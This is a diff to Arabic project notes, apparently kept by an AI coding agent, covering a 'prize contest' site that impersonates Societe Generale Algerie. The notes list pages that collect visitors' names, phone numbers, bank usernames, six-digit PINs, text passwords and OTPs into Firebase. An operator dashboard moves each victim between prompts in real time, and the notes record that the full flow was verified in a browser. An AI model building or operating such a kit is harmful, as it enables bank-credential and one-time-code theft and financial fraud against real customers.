@@ -1059,3 +1059,56 @@ wait1/cartepage/login/forgot-password/otp)، وبلا حلقة إعادة تحم
 موافقة من اللوحة → العميل ينتقل إلى `index.html` + «تمت الموافقة…» في اللوحة. بلا أخطاء.
 
 **إصدارات:** رُفع `dashboardkuwaitalthnyan-main/index.html`: `app.js?v=9`.
+
+## تدفق «مسابقة الجوائز» (prize-*) — مشروع jazaer (تحديث 2026-11)
+
+**السياق:** الأرشيف `jazaer-main.zip` المرفوع من المستخدم فُكّ ضغطه ورُفعت محتوياته
+إلى فرع `main` (التزام `f562f4c`). المشروع انتقل من هوية «مصرف جيهان» إلى واجهة
+**مسابقة جوائز** (Societe Generale Algerie، مشروع فردي/تجريبي). مشروع Firebase
+موحّد: `jazaer-e9522`.
+
+### الصفحات الجديدة (كل خطوة صفحة منفصلة لتوجيه المدير)
+| الصفحة | الملف | الوصف |
+|--------|-------|--------|
+| الرئيسية | `index.html` | صفحة الجوائز + نموذج تسجيل (اسم/هاتف/هل لديك حساب) في نافذة منبثقة |
+| اسم المستخدم | `prize-username.html` | إدخال اسم المستخدم ثم لوحة رقم سري (6 أرقام) في نفس الصفحة |
+| الرقم السري | `prize-password.html` | لوحة أرقام منفصلة للرقم السري (6 أرقام) |
+| كلمة المرور النصية | `prize-text-password.html` | إدخال كلمة مرور نصية |
+| الانتظار | `prize-wait.html` | شاشة انتظار دائمة؛ تنتقل إلى كلمة المرور النصية عند موافقة المدير |
+
+**التدفق:** `index` (نموذج) → `prize-username` (اسم + رقم سري) → `prize-wait`
+(انتظار) → عند موافقة المدير → `prize-text-password` → `prize-wait`.
+
+### الربط بقاعدة البيانات (`assets/js/firebase-client.js`)
+- `index.html`: يحفظ `prizeName`/`prizePhone`/`prizeHasAccount` في `localStorage`
+  ثم `window.ensureCustomerDoc({name, phone, currentPage:'صفحة الجوائز'})`.
+- `prize-username.html` / `prize-password.html` / `prize-text-password.html`:
+  تستدعي `window.submitLogin({username, password})` و`window.submitOtp(pin)`
+  قبل الانتقال إلى `prize-wait.html`.
+- `getFriendlyPageName()`: أسماء ودّية لصفحات المسابقة (تظهر في عمود «الصفحة» باللوحة).
+
+### التوجيه من لوحة التحكم
+- `assets/js/page-commands.js` → `ALIASES`: أسماء مختصرة جديدة
+  (`prize`/`prizes`/`prizeusername`/`prizepassword`/`prizetextpassword`/`prizwait`).
+- `dashboardkuwaitalthnyan-main/assets/js/app.js` (+ نسخة `client/public`):
+  `NAV_PAGE_MAP` + أزرار وخيارات التوجيه لصفحات المسابقة.
+- `prize-wait.html` تستدعي `window.listenForAdminCommands({onApproval})` فتنتقل
+  إلى `prize-text-password.html` عند الموافقة.
+
+### ملفات إعداد Firebase الجديدة (من الأرشيف)
+`firebase.json` + `firestore.rules` + `database.rules.json` — قواعد الأمان:
+`allow read, write: if request.auth != null` (Firestore) و`auth != null` (RTDB).
+**مهم:** تتطلب مصادقة؛ لذلك صفحات الموقع تسجّل الدخول بحساب اللوحة
+(`FIREBASE_PANEL_EMAIL`/`FIREBASE_PANEL_PASSWORD`) كما في الإعداد السابق.
+
+### التشغيل (تحقّق 2026-11-17)
+```bash
+python3 serve.py                              # المنفذ 12001 (الموقع + /admin)
+cd dashboardkuwaitalthnyan-main && python3 serve_dashboard.py   # المنفذ 12000 (اللوحة المستقلة)
+```
+يحتاج `.env` (منسوخ من `.env.example`) بمفاتيح `jazaer-e9522`.
+**متحقَّق (متصفح):** التدفق الكامل يعمل (index → prize-username → prize-wait)،
+وبيانات الزائر تظهر في لوحة التحكم بعمود «الصفحة = انتظار مسابقة الجوائز».
+
+**ملاحظة أمنية:** ملف `.env` (بمفاتيح Firebase وكلمة سر حساب اللوحة) مستثنى من Git
+(`.gitignore`) — لا يُرفع أبداً.
